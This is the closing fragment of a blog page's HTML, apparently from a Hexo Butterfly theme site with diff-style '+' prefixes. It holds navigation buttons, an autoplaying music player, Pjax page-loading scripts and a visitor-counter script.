id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="13468436268" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false 
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
